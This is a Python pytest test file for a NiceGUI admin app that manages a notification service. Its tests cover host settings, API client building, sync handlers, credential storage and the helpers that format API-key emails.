"""
Tests for main.py

Note: NiceGUI UI components cannot be easily tested without a running server.
These tests focus on the business logic functions that can be tested in isolation.
"""

import os
import json
import pytest
import httpx
from contextlib import contextmanager
from types import SimpleNamespace
from unittest.mock import ANY, AsyncMock, MagicMock, patch, Mock
from dataclasses import dataclass

from app.api_client import MockNotificationAPI, HttpNotificationAPI
from app.config import DEFAULT_NON_PRODUCTION_ENVIRONMENTS, AppConfig
from app.crypto import EncryptionManager
from app.repository import DbSaltProvider, UNASSIGNED_SERVICE_FILTER
from app.ui import state as _st
from app.ui import helpers
from app.ui import email_helpers
from app.ui import shell
from app.ui import sync_handlers
from app.ui.pages import (
    api_key_service as page_api_key_service,
    api_keys as page_api_keys,
    bulk_send as page_bulk_send,
    comm_items as page_comm_items,
    dashboard as page_dashboard,
    inbound_numbers as page_inbound_numbers,
    provider_details as page_provider_details,
    send as page_send,
    service_callbacks as page_service_callbacks,
    services as page_services,
    settings_page as page_settings,
    sms_senders as page_sms_senders,
    templates as page_templates,
    users as page_users,
)

import main  # noqa: E402, F401 — triggers sys.modules['main'] registration


@pytest.mark.asyncio
async def test_ensure_default_hosts(initialized_db, mock_config):
    """Test that default hosts are set if they don't exist."""
    from app.repository import get_setting

    # Temporarily replace the config
    original_config = _st.config
    _st.config = mock_config

    try:
        # Clear any existing settings first
        from sqlalchemy import delete
        from app.models import Setting
        from app.db import get_session

        async with get_session() as session:
            await session.execute(delete(Setting))
            await session.commit()

        # Call the function
        await _st.ensure_default_hosts()

        # Verify settings were created
        for env, url in mock_config.api_hosts.items():
            setting_value = await get_setting(f"base_url_{env}")
            assert setting_value == url
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_ensure_default_hosts_existing(initialized_db, mock_config):
    """Test that existing host settings are not overwritten."""
    from app.repository import get_setting, set_setting

    original_config = _st.config
    _st.config = mock_config

    try:
        # Set an existing value
        await set_setting("base_url_development", "http://custom.test.com")

        # Call the function
        await _st.ensure_default_hosts()

        # Verify the existing value was not overwritten
        setting_value = await get_setting("base_url_development")
        assert setting_value == "http://custom.test.com"

        # But staging should be set to default
        staging_value = await get_setting("base_url_staging")
        assert staging_value == mock_config.api_hosts["staging"]
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_build_api_client_mock(initialized_db, mock_config):
    """Test building an API client with mock enabled."""

    original_config = _st.config
    _st.config = mock_config
    _st.config.use_mock_api = True

    try:
        api = await _st.build_api_client("development")
        assert isinstance(api, MockNotificationAPI)
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_build_api_client_http(initialized_db, mock_config, mock_encryption):
    """Test building an HTTP API client."""
    from app.repository import set_setting, set_secure_setting

    original_config = _st.config
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.config.use_mock_api = False
    _st.encryption = mock_encryption

    try:
        # Set up required settings
        await set_setting("base_url_development", "http://api.test.com")
        await set_secure_setting("basic_username_development", "testuser", mock_encryption)
        await set_secure_setting("basic_password_development", "testpass", mock_encryption)

        api = await _st.build_api_client("development")
        assert isinstance(api, HttpNotificationAPI)
        assert api.base_url == "http://api.test.com"
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_build_api_client_missing_url(initialized_db, mock_config):
    """Test that build_api_client raises error when URL is missing."""

    original_config = _st.config
    _st.config = AppConfig(
        master_key="test-key",
        api_hosts={},
        use_mock_api=False,
        database_path=":memory:",
        max_concurrency=5,
    )

    try:
        with pytest.raises(RuntimeError, match="Base URL missing"):
            await _st.build_api_client("nonexistent")
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_build_api_client_remaps_db_url(initialized_db, mock_config, mock_encryption):
    """Test that build_api_client remaps localhost in DB URLs when CONTAINER_HOST is set."""
    from app.repository import set_secure_setting, set_setting

    original_config = _st.config
    original_encryption = _st.encryption
    _st.config = AppConfig(
        master_key=mock_config.master_key,
        api_hosts={"local": "http://localhost:6011"},
        use_mock_api=False,
        database_path=mock_config.database_path,
        max_concurrency=5,
        container_host="host.docker.internal",
    )
    _st.encryption = mock_encryption

    try:
        await set_setting("base_url_local", "http://localhost:6011")
        await set_secure_setting("basic_username_local", "user", mock_encryption)
        await set_secure_setting("basic_password_local", "pass", mock_encryption)

        api = await _st.build_api_client("local")
        assert isinstance(api, HttpNotificationAPI)
        assert api.base_url == "http://host.docker.internal:6011"
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_refresh_status_badge(initialized_db, mock_config):
    """Test refreshing the status badge."""

    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True

    # Create a mock badge
    mock_badge = MagicMock()
    mock_badge.text = ""
    mock_badge.props = MagicMock()

    # Create a mock state
    @dataclass
    class TestState:
        environment: str
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = True
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development"}

    _st.state = TestState(environment="development")

    try:
        await _st.refresh_status_badge(mock_badge)

        # MockNotificationAPI always returns True for healthcheck
        assert _st.state.api_status == "online"
        assert mock_badge.text == "API Status: Online"
        mock_badge.props.assert_called_once_with("color=green")
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_refresh_status_badge_offline(initialized_db, mock_config):
    """Test refreshing the status badge when API is offline."""

    original_config = _st.config
    original_state = _st.state

    mock_config.use_mock_api = False
    _st.config = mock_config

    mock_badge = MagicMock()
    mock_badge.text = ""
    mock_badge.props = MagicMock()

    @dataclass
    class TestState:
        environment: str
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = True
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development"}

    _st.state = TestState(environment="development")

    try:
        # Mock build_api_client to return an API that fails healthcheck
        with patch.object(_st, "build_api_client") as mock_build:
            mock_api = AsyncMock()
            mock_api.healthcheck = AsyncMock(return_value=False)
            mock_build.return_value = mock_api

            await _st.refresh_status_badge(mock_badge)

            assert _st.state.api_status == "offline"
            assert mock_badge.text == "API Status: Offline"
            mock_badge.props.assert_called_once_with("color=red")
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_handle_full_sync(initialized_db, mock_config):
    """Test the full sync handler."""

    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True

    @dataclass
    class TestState:
        environment: str
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = True
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development"}

    _st.state = TestState(environment="development")

    mock_status_badge = MagicMock()
    mock_status_badge.text = ""
    mock_status_badge.props = MagicMock()

    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    try:
        result = await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)

        # Verify sync messages were set
        assert mock_sync_label.text == "Sync complete"
        assert result is True
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_save_base_urls(initialized_db):
    """Test saving base URLs."""
    from app.repository import get_setting

    # Create mock inputs
    mock_inputs = {
        "dev": MagicMock(value="http://dev.new.com"),
        "prod": MagicMock(value="http://prod.new.com"),
        "empty": MagicMock(value=""),
    }

    # Mock ui.notify to avoid NiceGUI context issues
    with patch("app.ui.pages.settings_page.ui.notify"):
        await page_settings.save_base_urls(mock_inputs)

    # Verify non-empty values were saved
    assert await get_setting("base_url_dev") == "http://dev.new.com"
    assert await get_setting("base_url_prod") == "http://prod.new.com"
    # Empty value should not be saved
    assert await get_setting("base_url_empty") is None


@pytest.mark.asyncio
async def test_save_admin_auth(initialized_db, mock_encryption):
    """Test saving admin authentication."""
    from app.repository import get_secure_setting

    original_encryption = _st.encryption
    _st.encryption = mock_encryption

    try:
        # Create mock auth inputs
        mock_auth_inputs = {
            "dev": {
                "user": MagicMock(value="devuser"),
                "pass": MagicMock(value="devpass"),
            },
            "prod": {"user": MagicMock(value=""), "pass": MagicMock(value="prodpass")},
        }

        # Mock ui.notify to avoid NiceGUI context issues
        with patch("app.ui.pages.settings_page.ui.notify"):
            await page_settings.save_admin_auth(mock_auth_inputs)

        # Verify only complete pairs were saved
        dev_user = await get_secure_setting("basic_username_dev", mock_encryption)
        dev_pass = await get_secure_setting("basic_password_dev", mock_encryption)
        assert dev_user == "devuser"
        assert dev_pass == "devpass"

        # Prod should not be saved (incomplete pair)
        prod_user = await get_secure_setting("basic_username_prod", mock_encryption)
        assert prod_user is None
    finally:
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_save_local_key_success(initialized_db, mock_encryption):
    """Test saving a local API key."""
    from app.repository import list_local_keys

    original_encryption = _st.encryption
    _st.encryption = mock_encryption

    try:
        # Mock ui.notify and render_local_keys.refresh()
        with (
            patch("app.ui.pages.settings_page.ui.notify"),
            patch.object(page_settings, "render_local_keys", create=True) as mock_render,
        ):
            mock_render.refresh = AsyncMock()

            await page_settings.save_local_key("dev", "svc-1", "Test Key", "secret123", "normal")

            # Verify key was saved
            keys = await list_local_keys(service_id="svc-1", environment="dev")
            assert len(keys) == 1
            assert keys[0].key_name == "Test Key"
            assert keys[0].key_type == "normal"
    finally:
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_save_local_key_missing_params(initialized_db, mock_encryption):
    """Test that save_local_key rejects missing parameters."""

    original_encryption = _st.encryption
    _st.encryption = mock_encryption

    try:
        # Mock ui.notify and render_local_keys.refresh()
        with (
            patch("app.ui.pages.settings_page.ui.notify"),
            patch.object(page_settings, "render_local_keys", create=True) as mock_render,
        ):
            mock_render.refresh = AsyncMock()

            # Should not raise error, just notify user
            await page_settings.save_local_key(None, "svc-1", "name", "secret", "normal")
            await page_settings.save_local_key("dev", None, "name", "secret", "normal")
            await page_settings.save_local_key("dev", "svc-1", "", "secret", "normal")
            await page_settings.save_local_key("dev", "svc-1", "name", "", "normal")

            # Verify no keys were saved
            from app.repository import list_local_keys

            keys = await list_local_keys()
            assert len(keys) == 0
    finally:
        _st.encryption = original_encryption


def test_metric_card():
    """Test the metric_card helper function."""

    # This function creates UI elements, so we just verify it doesn't crash
    # when called (we can't easily test the UI output without NiceGUI running)
    with patch("app.ui.helpers.ui.card") as mock_card:
        mock_card.return_value.__enter__ = Mock(return_value=None)
        mock_card.return_value.__exit__ = Mock(return_value=None)

        with patch("app.ui.shell.ui.label"):
            helpers.metric_card("Test Title", 42)

            # Verify card was created
            assert mock_card.called


def test_app_state_creation():
    """Test AppState dataclass creation."""
    from app.ui.state import AppState

    state = AppState(environment="test")
    assert state.environment == "test"
    assert state.api_status == "unknown"
    assert state.sync_message == ""

    state2 = AppState(environment="prod", api_status="online", sync_message="Syncing...")
    assert state2.environment == "prod"
    assert state2.api_status == "online"
    assert state2.sync_message == "Syncing..."


def test_get_copyable_fields():
    """Test extraction of copy-enabled fields from table rows."""

    assert helpers.get_copyable_fields([]) == []
    assert helpers.get_copyable_fields([{"id": "svc-1", "name": "Service", "active": True}]) == [
        "id",
        "name",
    ]


@pytest.mark.asyncio
async def test_startup_function(initialized_db, mock_config):
    """Test the startup function by calling ensure_default_hosts directly."""

    original_config = _st.config
    _st.config = mock_config

    try:
        # The startup function is decorated, so test its components directly
        # Test create_all
        from app.db import create_all

        await create_all()

        # Test ensure_default_hosts
        await _st.ensure_default_hosts()

        # Verify ensure_default_hosts worked (settings should exist)
        from app.repository import get_setting

        for env in mock_config.api_hosts.keys():
            setting = await get_setting(f"base_url_{env}")
            assert setting is not None
    finally:
        _st.config = original_config


def test_build_shell():
    """Test build_shell creates the UI structure."""

    # Mock all UI components to avoid NiceGUI context issues
    with (
        patch("app.ui.shell.ui.left_drawer") as mock_drawer,
        patch("app.ui.shell.ui.header") as mock_header,
        patch("app.ui.shell.ui.row") as mock_row,
        patch("app.ui.shell.ui.badge") as mock_badge,
        patch("app.ui.shell.ui.label") as mock_label,
        patch("app.ui.shell.ui.button") as mock_button,
        patch("app.ui.shell.ui.dark_mode") as mock_dark_mode,
        patch("app.ui.shell.ui.link"),
        patch("app.ui.shell.ui.select") as mock_select,
        patch("app.ui.shell.ui.dropdown_button") as mock_dropdown,
        patch("app.ui.shell.ui.checkbox") as mock_checkbox,
    ):
        # Set up the mock context managers
        mock_drawer_obj = MagicMock()
        mock_drawer_obj.__enter__ = Mock(return_value=None)
        mock_drawer_obj.__exit__ = Mock(return_value=None)
        mock_drawer_obj.toggle = MagicMock()
        mock_drawer_obj.props = MagicMock(return_value=mock_drawer_obj)
        mock_drawer_obj.classes = MagicMock(return_value=mock_drawer_obj)
        mock_drawer.return_value = mock_drawer_obj

        mock_header_obj = MagicMock()
        mock_header_obj.__enter__ = Mock(return_value=None)
        mock_header_obj.__exit__ = Mock(return_value=None)
        mock_header_obj.classes = MagicMock(return_value=mock_header_obj)
        mock_header.return_value = mock_header_obj

        mock_row_obj = MagicMock()
        mock_row_obj.__enter__ = Mock(return_value=None)
        mock_row_obj.__exit__ = Mock(return_value=None)
        mock_row_obj.classes = MagicMock(return_value=mock_row_obj)
        mock_row.return_value = mock_row_obj

        mock_badge_obj = MagicMock()
        mock_badge.return_value = mock_badge_obj

        mock_label_obj = MagicMock()
        mock_label_obj.classes = MagicMock(return_value=mock_label_obj)
        mock_label.return_value = mock_label_obj

        mock_button_obj = MagicMock()
        mock_button_obj.props = MagicMock(return_value=mock_button_obj)
        mock_button.return_value = mock_button_obj

        mock_dark_mode.return_value = MagicMock()

        mock_select_obj = MagicMock()
        mock_select_obj.classes = MagicMock(return_value=mock_select_obj)
        mock_select_obj.on_value_change = MagicMock()
        mock_select.return_value = mock_select_obj

        mock_dropdown_obj = MagicMock()
        mock_dropdown_obj.__enter__ = Mock(return_value=None)
        mock_dropdown_obj.__exit__ = Mock(return_value=None)
        mock_dropdown_obj.props = MagicMock(return_value=mock_dropdown_obj)
        mock_dropdown.return_value = mock_dropdown_obj

        mock_checkbox_obj = MagicMock()
        mock_checkbox_obj.on_value_change = MagicMock()
        mock_checkbox.return_value = mock_checkbox_obj

        # Call build_shell
        result = shell.build_shell()

        # Verify it returns a tuple
        assert isinstance(result, tuple)
        assert len(result) == 5  # status_badge, sync_label, refresh_button, dark_mode, theme_button


def test_module_level_initialization():
    """Test that module-level objects are initialized correctly."""

    # Verify global objects exist
    assert _st.config is not None
    assert isinstance(_st.config, AppConfig)

    assert _st.encryption is not None
    assert isinstance(_st.encryption, EncryptionManager)

    assert _st.state is not None
    assert hasattr(_st.state, "environment")
    assert hasattr(_st.state, "api_status")
    assert hasattr(_st.state, "sync_message")


@pytest.mark.asyncio
async def test_integration_full_workflow(initialized_db, mock_config, mock_encryption):
    """Integration test simulating a full workflow."""
    from app.repository import get_setting

    original_config = _st.config
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.encryption = mock_encryption

    try:
        # 1. Initialize default hosts
        await _st.ensure_default_hosts()

        # 2. Verify hosts were set
        for env in mock_config.api_hosts.keys():
            url = await get_setting(f"base_url_{env}")
            assert url == mock_config.api_hosts[env]

        # 3. Build API client
        api = await _st.build_api_client("development")
        assert api is not None

        # 4. Test healthcheck would work
        result = await api.healthcheck()
        assert result is True  # MockNotificationAPI always returns True

        # Integration test passes
        assert True
    finally:
        _st.config = original_config
        _st.encryption = original_encryption


@pytest.mark.asyncio
async def test_handle_full_sync_only_syncs_enabled_envs(initialized_db, mock_config):
    """Test that sync only runs for environments in enabled_sync_environments."""

    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True

    @dataclass
    class TestState:
        environment: str
        view_environments: list = None
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = True
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development"}
            if self.view_environments is None:
                self.view_environments = []

    # Only development is enabled
    _st.state = TestState(environment="staging")

    mock_status_badge = MagicMock()
    mock_status_badge.props = MagicMock()
    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    try:
        result = await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)

        # Sync completes for the enabled environment (development)
        assert mock_sync_label.text == "Sync complete"
        assert result is True
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_handle_full_sync_dev_only_mode_allows_dev(initialized_db, mock_config):
    """Test that enabled_sync_environments allows syncing enabled environments."""

    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True

    @dataclass
    class TestState:
        environment: str
        view_environments: list = None
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = True
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development"}
            if self.view_environments is None:
                self.view_environments = []

    _st.state = TestState(environment="development")

    mock_status_badge = MagicMock()
    mock_status_badge.props = MagicMock()
    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    try:
        result = await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)

        # Verify sync completed
        assert mock_sync_label.text == "Sync complete"
        assert result is True
    finally:
        _st.config = original_config
        _st.state = original_state


@pytest.mark.asyncio
async def test_handle_full_sync_multiple_envs_enabled(initialized_db, mock_config):
    """Test that adding environments to enabled_sync_environments syncs all of them."""

    original_config = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.config.use_mock_api = True

    @dataclass
    class TestState:
        environment: str
        view_environments: list = None
        api_status: str = "unknown"
        sync_message: str = ""
        dev_only_mode: bool = False
        enabled_sync_environments: set = None

        def __post_init__(self):
            if self.enabled_sync_environments is None:
                self.enabled_sync_environments = {"development", "staging"}
            if self.view_environments is None:
                self.view_environments = []

    _st.state = TestState(environment="staging")

    mock_status_badge = MagicMock()
    mock_status_badge.props = MagicMock()
    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    try:
        result = await sync_handlers.handle_full_sync(mock_status_badge, mock_sync_label)

        # Verify sync completed - may show partial success if not all envs work
        assert "Sync complete" in mock_sync_label.text
        assert result is True
    finally:
        _st.config = original_config
        _st.state = original_state


# Helper: SharedTestState used by multiple tests below
@dataclass
class SharedTestState:
    environment: str
    api_status: str = "unknown"
    sync_message: str = ""
    dev_only_mode: bool = True
    enabled_sync_environments: set = None
    view_environments: list = None

    def __post_init__(self):
        if self.enabled_sync_environments is None:
            self.enabled_sync_environments = {"development"}
        if self.view_environments is None:
            self.view_environments = []


# ===================================================================
# Pure helper function tests
# ===================================================================


class TestSuppressGzipCloseError:
    """Tests for _suppress_gzip_close_error."""

    def test_suppresses_gzip_valueerror(self):
        import gzip

        args = MagicMock(spec=["exc_type", "exc_value", "exc_traceback", "object"])
        args.exc_value = ValueError("I/O operation on closed file")
        args.object = gzip.GzipFile(fileobj=MagicMock())

        result = shell._suppress_gzip_close_error(args)
        assert result is None

    def test_passes_through_non_valueerror(self):
        args = MagicMock(spec=["exc_type", "exc_value", "exc_traceback", "object"])
        args.exc_value = RuntimeError("something else")
        args.object = MagicMock()

        with patch.object(shell, "_original_unraisablehook") as mock_hook:
            shell._suppress_gzip_close_error(args)
            mock_hook.assert_called_once_with(args)

    def test_passes_through_valueerror_not_gzipfile(self):
        args = MagicMock(spec=["exc_type", "exc_value", "exc_traceback", "object"])
        args.exc_value = ValueError("I/O operation on closed file")
        args.object = "not a gzip file"

        with patch.object(shell, "_original_unraisablehook") as mock_hook:
            shell._suppress_gzip_close_error(args)
            mock_hook.assert_called_once_with(args)


class TestSafeClientDelete:
    """Tests for _safe_client_delete."""

    def test_successful_delete(self):
        mock_self = MagicMock()
        with patch.object(shell, "_original_client_delete") as mock_delete:
            shell._safe_client_delete(mock_self)
            mock_delete.assert_called_once_with(mock_self)

    def test_keyerror_sets_deleted(self):
        mock_self = MagicMock()
        mock_self.id = "test-id"
        with patch.object(shell, "_original_client_delete", side_effect=KeyError("already deleted")):
            shell._safe_client_delete(mock_self)
            assert mock_self._deleted is True


class TestAppStateViewEnvironmentsFallback:
    """Test AppState view_environments fallback to empty list (all)."""

    def test_none_view_environments_defaults_to_empty(self):
        from app.ui.state import AppState

        st = AppState(environment="dev", view_environments=None)
        assert st.view_environments == []

    def test_default_view_environments_is_empty(self):
        from app.ui.state import AppState

        st = AppState(environment="dev")
        assert st.view_environments == []


class TestCheckApiOnline:
    """Test check_api_online function."""

    async def test_returns_true_for_mock_api(self):
        from app.ui import state as _st

        original_use_mock = _st.config.use_mock_api
        try:
            _st.config.use_mock_api = True
            result = await _st.check_api_online("dev")
            assert result is True
        finally:
            _st.config.use_mock_api = original_use_mock

    async def test_returns_false_on_connection_error(self):
        from app.ui import state as _st

        original_use_mock = _st.config.use_mock_api
        original_hosts = _st.config.api_hosts.copy()
        try:
            _st.config.use_mock_api = False
            _st.config.api_hosts = {"bad": "http://localhost:99999"}
            result = await _st.check_api_online("bad")
            assert result is False
        finally:
            _st.config.use_mock_api = original_use_mock
            _st.config.api_hosts = original_hosts


class TestNormalizeEmailEnv:
    def test_development_maps_to_dev(self):
        assert email_helpers._normalize_email_env("development") == "dev"

    def test_production_maps_to_prod(self):
        assert email_helpers._normalize_email_env("production") == "prod"

    def test_other_passes_through(self):
        assert email_helpers._normalize_email_env("staging") == "staging"
        assert email_helpers._normalize_email_env("dev") == "dev"


class TestFormatEmailEnvLabel:
    def test_prod_returns_production(self):
        assert email_helpers._format_email_env_label("prod") == "Production"
        assert email_helpers._format_email_env_label("production") == "Production"

    def test_other_returns_title_case(self):
        assert email_helpers._format_email_env_label("dev") == "Dev"
        assert email_helpers._format_email_env_label("staging") == "Staging"


class TestResolveEmailEndpoints:
    def test_known_env(self):
        public_url, private_url = email_helpers._resolve_email_endpoints("dev")
        assert public_url == "https://dev-api.va.gov/vanotify"
        assert private_url == "https://dev.api.notifications.va.gov"

    def test_unknown_env_with_config_fallback(self):
        original_config = _st.config
        _st.config = AppConfig(
            master_key="k",
            api_hosts={"custom": "http://custom.test.com/"},
            use_mock_api=True,
            database_path=":memory:",
            max_concurrency=5,
        )
        try:
            public_url, private_url = email_helpers._resolve_email_endpoints("custom")
            assert public_url == private_url
            assert public_url == "http://custom.test.com"
        finally:
            _st.config = original_config

    def test_unknown_env_no_config_raises(self):
        original_config = _st.config
        _st.config = AppConfig(
            master_key="k",
            api_hosts={},
            use_mock_api=True,
            database_path=":memory:",
            max_concurrency=5,
        )
        try:
            with pytest.raises(ValueError, match="No email endpoints configured"):
                email_helpers._resolve_email_endpoints("nonexistent")
        finally:
            _st.config = original_config


class TestFormatExpiryDate:
    def test_empty_returns_unknown(self):
        assert email_helpers._format_expiry_date("") == "unknown"
        assert email_helpers._format_expiry_date(None) == "unknown"

    def test_iso_date_splits(self):
        assert email_helpers._format_expiry_date("2025-01-15T12:00:00Z") == "2025-01-15"
        assert email_helpers._format_expiry_date("2025-01-15") == "2025-01-15"


class TestSelectLatestKey:
    def test_single_match(self):
        keys = [{"name": "key1", "created_at": "2025-01-01"}]
        assert email_helpers._select_latest_key(keys, "key1") == keys[0]

    def test_multiple_matches_returns_latest(self):
        keys = [
            {"name": "key1", "created_at": "2025-01-01"},
            {"name": "key1", "created_at": "2025-06-01"},
            {"name": "key2", "created_at": "2025-12-01"},
        ]
        result = email_helpers._select_latest_key(keys, "key1")
        assert result["created_at"] == "2025-06-01"

    def test_no_match_raises(self):
        with pytest.raises(ValueError, match="No keys found"):
            email_helpers._select_latest_key([{"name": "other"}], "missing")


class TestBuildKeyEmail:
    def test_contains_key_parts(self):
        created_key = {
            "name": "my-key",
            "id": "key-id-123",
            "expiry_date": "2025-12-31T00:00:00Z",
        }
        result = email_helpers._build_key_email("secret-abc", created_key, "dev", "My Service", "svc-1")
        assert "secret-abc" in result
        assert "my-key" in result
        assert "key-id-123" in result
        assert "2025-12-31" in result
        assert "My Service" in result
        assert "svc-1" in result
        assert "Dev Details" in result


class TestBuildEnvSection:
    def test_contains_env_parts(self):
        created_key = {
            "name": "my-key",
            "id": "key-id-123",
            "expiry_date": "2025-12-31T00:00:00Z",
        }
        result = email_helpers._build_env_section("dev", "secret-abc", created_key, "My Service", "svc-1")
        assert "secret-abc" in result
        assert "my-key" in result
        assert "2025-12-31" in result
        assert "My Service" in result
        assert "svc-1" in result
        assert "Dev Details" in result
        assert "dev.api.notifications.va.gov" in result


class TestBuildMultiEnvKeyEmail:
    def test_single_env(self):
        env_keys = [
            {
                "env": "dev",
                "secret": "secret-dev",
                "service_id": "svc-dev-1",
                "created_key": {
                    "name": "dev-app-key",
                    "id": "key-dev-123",
                    "expiry_date": "2025-12-31",
                },
            }
        ]
        result = email_helpers._build_multi_env_key_email(env_keys, "My Service")
        assert "secret-dev" in result
        assert "dev-app-key" in result
        assert "Dev Details" in result
        assert "My Service" in result
        assert "svc-dev-1" in result
        assert "Please confirm receipt" in result

    def test_multi_env(self):
        env_keys = [
            {
                "env": "dev",
                "secret": "secret-dev",
                "service_id": "svc-dev-1",
                "created_key": {
                    "name": "dev-app-key",
                    "id": "key-dev-123",
                    "expiry_date": "2025-12-31",
                },
            },
            {
                "env": "staging",
                "secret": "secret-staging",
                "service_id": "svc-staging-2",
                "created_key": {
                    "name": "staging-app-key",
                    "id": "key-staging-456",
                    "expiry_date": "2025-12-31",
                },
            },
            {
                "env": "prod",
                "secret": "secret-prod",
                "service_id": "svc-prod-3",
                "created_key": {
                    "name": "prod-app-key",
                    "id": "key-prod-789",
                    "expiry_date": "2025-12-31",
                },
            },
        ]
        result = email_helpers._build_multi_env_key_email(
            env_keys, "My Service", template=email_helpers.EmailTemplate.NEW_SERVICE
        )
        # Verify all env sections are present
        assert "Dev Details" in result
        assert "secret-dev" in result
        assert "svc-dev-1" in result
        assert "Staging Details" in result
        assert "secret-staging" in result
        assert "svc-staging-2" in result
        assert "Production Details" in result
        assert "secret-prod" in result
        assert "svc-prod-3" in result
        # Verify service info appears
        assert "My Service" in result
        # Verify common parts
        assert "Please confirm receipt" in result
        # New service template includes endpoints
        assert "api.notifications.va.gov" in result

    def test_key_rotation_template_omits_endpoints(self):
        env_keys = [
            {
                "env": "dev",
                "secret": "secret-dev",
                "service_id": "svc-dev-1",
                "created_key": {
                    "name": "dev-app-key",
                    "id": "key-dev-123",
                    "expiry_date": "2025-12-31",
                },
            }
        ]
        result = email_helpers._build_multi_env_key_email(
            env_keys, "My Service", template=email_helpers.EmailTemplate.KEY_ROTATION
        )
        assert "secret-dev" in result
        assert "dev-app-key" in result
        assert "Dev Details" in result
        assert "My Service" in result
        # Key rotation template omits endpoint URLs
        assert "api.notifications.va.gov" not in result
        assert "dev-api.va.gov/vanotify" not in result
        assert "VA Notify Endpoints" not in result
        # Key rotation template has same intro as new key template
        assert "API key(s)" in result


class TestBuildEnvSectionWithEndpoints:
    def test_include_endpoints_true(self):
        created_key = {"name": "my-key", "id": "key-123", "expiry_date": "2025-12-31"}
        result = email_helpers._build_env_section(
            "dev", "secret", created_key, "Service", "svc-1", include_endpoints=True
        )
        assert "dev.api.notifications.va.gov" in result
        assert "VA Notify Endpoints" in result

    def test_include_endpoints_false(self):
        created_key = {"name": "my-key", "id": "key-123", "expiry_date": "2025-12-31"}
        result = email_helpers._build_env_section(
            "dev", "secret", created_key, "Service", "svc-1", include_endpoints=False
        )
        assert "api.notifications.va.gov" not in result
        assert "VA Notify Endpoints" not in result
        # Still has key details
        assert "secret" in result
        assert "my-key" in result


class TestBuildKeyNameForEnv:
    def test_normal_key(self):
        result = page_api_key_service._build_key_name_for_env("dev", "myapp", False, False)
        assert result == "dev-myapp-key"

    def test_uuid_key(self):
        result = page_api_key_service._build_key_name_for_env("staging", "myapp", True, False)
        assert result == "staging-myapp-uuid-key"

    def test_test_key(self):
        result = page_api_key_service._build_key_name_for_env("prod", "myapp", False, True)
        assert result == "prod-myapp-test-key"

    def test_uuid_test_key(self):
        result = page_api_key_service._build_key_name_for_env("dev", "myapp", True, True)
        assert result == "dev-myapp-uuid-test-key"

    def test_env_alias_normalized(self):
        result = page_api_key_service._build_key_name_for_env("development", "myapp", False, False)
        assert result == "dev-myapp-key"


class TestFormatEnvironment:
    def test_returns_value(self):
        assert helpers.format_environment("dev") == "dev"

    def test_none_returns_unknown(self):
        assert helpers.format_environment(None) == "unknown"
        assert helpers.format_environment("") == "unknown"


class TestFormatServiceLabel:
    def test_returns_label(self):
        svc = MagicMock()
        svc.name = "My Service"
        svc.environment = "dev"
        assert helpers.format_service_label(svc) == "My Service (dev)"


class TestTruncateText:
    def test_none_returns_none(self):
        assert helpers.truncate_text(None) is None

    def test_short_text_unchanged(self):
        assert helpers.truncate_text("hello", 50) == "hello"

    def test_long_text_truncated(self):
        result = helpers.truncate_text("a" * 60, 50)
        assert result == "a" * 50 + "..."


class TestBuildServiceNameMap:
    def test_builds_map(self):
        svc1 = MagicMock()
        svc1.id = "id-1"
        svc1.name = "Service One"
        svc2 = MagicMock()
        svc2.id = "id-2"
        svc2.name = "Service Two"
        result = helpers.build_service_name_map([svc1, svc2])
        assert result == {"id-1": "Service One", "id-2": "Service Two"}

    def test_empty_list(self):
        assert helpers.build_service_name_map([]) == {}


class TestTruncateServiceName:
    def test_short_name_unchanged(self):
        assert helpers.truncate_service_name("Short Name") == "Short Name"

    def test_exact_limit_unchanged(self):
        name = "a" * 21
        assert helpers.truncate_service_name(name, 21) == name

    def test_long_name_truncated(self):
        name = "a" * 25
        assert helpers.truncate_service_name(name, 21) == "a" * 20 + "\u2026"

    def test_none_returns_empty(self):
        assert helpers.truncate_service_name(None) == ""

    def test_empty_returns_empty(self):
        assert helpers.truncate_service_name("") == ""

    def test_custom_limit(self):
        assert helpers.truncate_service_name("abcdef", 4) == "abc\u2026"


